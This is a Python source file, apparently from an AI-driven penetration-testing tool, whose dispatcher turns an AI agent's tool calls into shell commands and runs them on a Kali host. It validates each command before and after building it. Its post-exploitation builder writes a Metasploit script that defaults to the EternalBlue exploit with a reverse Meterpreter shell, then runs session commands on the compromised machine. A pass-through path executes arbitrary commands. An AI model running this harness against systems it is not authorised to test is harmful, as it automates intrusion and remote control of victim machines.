"""
Dispatcher — translates AI tool-call dicts into shell commands
and executes them via KaliAPI.

Security: Every tool_call is validated by command_sanitizer before
command construction, and the built command is validated again before
execution.  Rejected commands are logged and never sent to KaliAPI.
"""

import base64
import logging
import textwrap
import time

from hydrasight.config.defaults import TOOL_TIMEOUTS
from hydrasight.core.command_builder import CommandBuilder
from hydrasight.core.registry import ActionRegistryError, registry
from hydrasight.integrations.kali_api import KaliAPI
from hydrasight.models.commands import (
    ActionRequest,
    ExecutionRequest,
    PendingAction,
)
from hydrasight.security.command_sanitizer import (
    SanitizeResult,
    validate_built_command,
    validate_tool_call,
)
from hydrasight.utils.ip_utils import force_ip


class Dispatcher:
    """Translates actions into shell commands and runs them."""

    canonical_target: str | None = None

    def __init__(
        self,
        kali: KaliAPI,
        log: logging.Logger,
        cfg: dict,
    ) -> None:
        self.kali = kali
        self.log = log
        self.cfg = cfg

    # ── IP sanitisation ───────────────────────────────────────────────────────

    def _get_preserve_ips(self) -> list[str]:
        preserve = ["127.0.0.1"]
        if self.canonical_target:
            lhost = self.kali.local_ip(self.canonical_target)
            if lhost and lhost not in preserve:
                preserve.append(lhost)
        return preserve

    # ── dispatch ──────────────────────────────────────────────────────────────

    def dispatch(self, action_input: dict | ActionRequest | PendingAction | ExecutionRequest) -> tuple[str, str, float]:
        tool = ""
        args = {}
        rendered_cmd = None

        if isinstance(action_input, dict):
            tool = action_input.get("tool", "")
            args = dict(action_input.get("args", {}) or {})

            # Transitional adapter for post_exploit which hasn't been migrated to pure builder yet
            if tool == "post_exploit":
                return self._dispatch_legacy(tool, args)

            try:
                action_def = registry.get(tool)
                req = ActionRequest(action_id=action_def.action_id, target=args.get("target"), args=args)

                # In a full flow, ActionPlanner builds the spec. For legacy dict dispatch, we must rebuild it.
                # To avoid duplicating planner logic, we try to construct a basic CommandSpec here if it's a raw tool_call dict.
                if tool == "run_command":
                    cmd_str = args.get("command", "echo ok")
                    rendered_cmd = cmd_str
                else:
                    # Very basic reconstruction for legacy dictionaries:
                    # In standard paths, this won't be hit because Planner passes PendingAction.
                    from hydrasight.services.action_planner import ActionPlanner
                    planner = ActionPlanner()
                    spec = planner._build_spec(tool, req.target or self.canonical_target or "", None, [], self.cfg)
                    if spec:
                        rc = CommandBuilder.build(spec)
                        if not rc.is_safe:
                            return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
                        rendered_cmd = rc.raw_string
            except ActionRegistryError:
                if tool == "run_command":
                     rendered_cmd = args.get("command", "echo ok")
                else:
                    from hydrasight.services.action_planner import ActionPlanner
                    planner = ActionPlanner()
                    spec = planner._build_spec(tool, args.get("target") or self.canonical_target or "", None, [], self.cfg)
                    if spec:
                        rc = CommandBuilder.build(spec)
                        if not rc.is_safe:
                            return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
                        rendered_cmd = rc.raw_string
                    else:
                        return tool, f"[BLOCKED] unknown tool: {tool}", 0.0

        elif isinstance(action_input, ActionRequest):
            tool = action_input.action_id
            args = action_input.args
            from hydrasight.services.action_planner import ActionPlanner
            planner = ActionPlanner()
            spec = planner._build_spec(tool, action_input.target or self.canonical_target or "", None, [], self.cfg)
            if spec:
                rc = CommandBuilder.build(spec)
                if not rc.is_safe:
                    return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
                rendered_cmd = rc.raw_string

        elif isinstance(action_input, PendingAction):
            tool = action_input.request.action_id
            args = action_input.request.args
            rc = CommandBuilder.build(action_input.spec)
            if not rc.is_safe:
                return tool, f"[BLOCKED] Validation failed: {rc.validation_errors}", 0.0
            rendered_cmd = rc.raw_string

        elif isinstance(action_input, ExecutionRequest):
            tool = action_input.pending_action.request.action_id
            args = action_input.pending_action.request.args
            if not action_input.rendered.is_safe:
                return tool, f"[BLOCKED] Validation failed: {action_input.rendered.validation_errors}", 0.0
            rendered_cmd = action_input.rendered.raw_string

        if not rendered_cmd:
             return tool, f"[ERROR] Could not render command for tool: {tool}", 0.0

        preserve_ips = self._get_preserve_ips()

        if self.canonical_target:
            tgt = self.canonical_target
            if "target" in args:
                args["target"] = tgt
            if "url" in args:
                args["url"] = force_ip(args["url"], tgt, preserve=preserve_ips)

        # ── Phase 1: validate args ──────────────
        pre_check: SanitizeResult = validate_tool_call(tool, args)
        if not pre_check.allowed:
            self.log.warning(
                "BLOCKED tool_call [%s]: %s  args=%s",
                tool,
                pre_check.reason,
                args,
            )
            return tool, f"[BLOCKED] {pre_check.reason}", 0.0

        if self.canonical_target and tool != "post_exploit":
            rendered_cmd = force_ip(rendered_cmd, self.canonical_target, preserve=preserve_ips)

        # ── Phase 2: validate built command before execution ──────────────
        post_check: SanitizeResult = validate_built_command(rendered_cmd, tool)
        if not post_check.allowed:
            self.log.warning(
                "BLOCKED built command [%s]: %s  cmd=%s",
                tool,
                post_check.reason,
                rendered_cmd[:200],
            )
            return tool, f"[BLOCKED] {post_check.reason}", 0.0

        try:
            action_def = registry.get(tool)
            timeout = action_def.default_timeout

            # Apply profile multiplier if applicable
            if isinstance(action_input, (ActionRequest, PendingAction, ExecutionRequest)):
                if isinstance(action_input, ExecutionRequest):
                    req = action_input.pending_action.request
                elif isinstance(action_input, PendingAction):
                    req = action_input.request
                else:
                    req = action_input

                if req.profile:
                    from hydrasight.core.profiles import PROFILES
                    prof = PROFILES.get(req.profile)
                    if prof:
                        timeout = int(timeout * prof.timeout_multiplier)

        except ActionRegistryError:
            timeout = TOOL_TIMEOUTS.get(tool, 300)

        t0 = time.time()
        result = self.kali.run(rendered_cmd, timeout=timeout)
        elapsed = time.time() - t0
        output = result.get("output", "")
        if not output and not result.get("success", True):
            output = f"[ERROR] {result.get('error', 'unknown error')}"
        return tool, output, elapsed

    def _build(self, tool: str, args: dict) -> str:
        """Compatibility wrapper for tests that directly test command building."""
        if tool == "post_exploit":
            return self._post_exploit(args)
        if tool == "run_command":
            return str(args.get("command", "echo ok"))

        try:
            from hydrasight.core.registry import registry
            act_id = registry.resolve_action_id(tool)
            if act_id:
                tool = act_id
        except Exception:
            pass

        from hydrasight.services.action_planner import ActionPlanner
        planner = ActionPlanner()
        # For test compatibility, we pass args that might have been mapped to specific fields
        # like ports or target.
        target = args.get("target")
        if not target and "url" in args:
            url = args["url"]
            if url.startswith("http://"):
                target = url[7:]
            elif url.startswith("https://"):
                target = url[8:]
            else:
                target = url
        if not target:
            target = "127.0.0.1"

        ports = args.get("ports")
        if not ports and "port" in args:
            ports = str(args["port"])

        # gobuster extensions flag compatibility for tests
        flags = []
        if "extensions" in args:
            flags.append("-x")
            flags.append(args["extensions"])

        spec = planner._build_spec(tool, target, ports, flags, self.cfg)
        if spec:
            from hydrasight.core.command_builder import CommandBuilder
            rc = CommandBuilder.build(spec)
            return rc.raw_string
        return ""

    def _dispatch_legacy(self, tool: str, args: dict) -> tuple[str, str, float]:
        """Transitional dispatcher for legacy string-building tools (post_exploit)."""
        pre_check: SanitizeResult = validate_tool_call(tool, args)
        if not pre_check.allowed:
            return tool, f"[BLOCKED] {pre_check.reason}", 0.0

        cmd = self._post_exploit(args)


        if self.canonical_target:
             args["target"] = self.canonical_target

        post_check: SanitizeResult = validate_built_command(cmd, tool)
        if not post_check.allowed:
            return tool, f"[BLOCKED] {post_check.reason}", 0.0

        timeout = TOOL_TIMEOUTS.get(tool, 420)
        t0 = time.time()
        result = self.kali.run(cmd, timeout=timeout)
        elapsed = time.time() - t0
        output = result.get("output", "")
        if not output and not result.get("success", True):
            output = f"[ERROR] {result.get('error', 'unknown error')}"
        return tool, output, elapsed

    # ── transitional command builders ──────────────────────────────────────────────────────

    def _post_exploit(self, a: dict) -> str:
        module = a.get("module", "exploit/windows/smb/ms17_010_eternalblue")
        target = a.get("target", "")
        rport = a.get("rport", 445)
        lport = a.get("lport", 4444)
        payload = a.get("payload", "windows/meterpreter/reverse_tcp")
        commands = a.get("commands", "getuid")
        lhost = self.kali.local_ip(target)

        cmd_block: list[str] = []
        for c in commands.split(";"):
            c = c.strip()
            if not c:
                continue
            cmd_block.append(f'sessions -i -1 -C "{c}"')
            cmd_block.append("sleep 4")

        is_aux = module.startswith("auxiliary/")
        payload_line = "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
        action_line = "run" if is_aux else "exploit -z"

        rc_content = textwrap.dedent(f"""\
            use {module}
            set RHOSTS {target}
            set RPORT {rport}
            set LHOST {lhost}
            set LPORT {lport}
            {payload_line}
            set ExitOnSession false
            set WfsDelay 30
            set EnableStageEncoding true
            {action_line}
            sleep 10
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 5
            sessions -K
            exit -y
        """)

        b64 = base64.b64encode(rc_content.encode()).decode()
        return (
            f"printf '%s' '{b64}' | base64 -d > /tmp/hs_exploit.rc && "
            f"msfconsole -q -r /tmp/hs_exploit.rc 2>&1 ; "
            f"rm -f /tmp/hs_exploit.rc"
        )
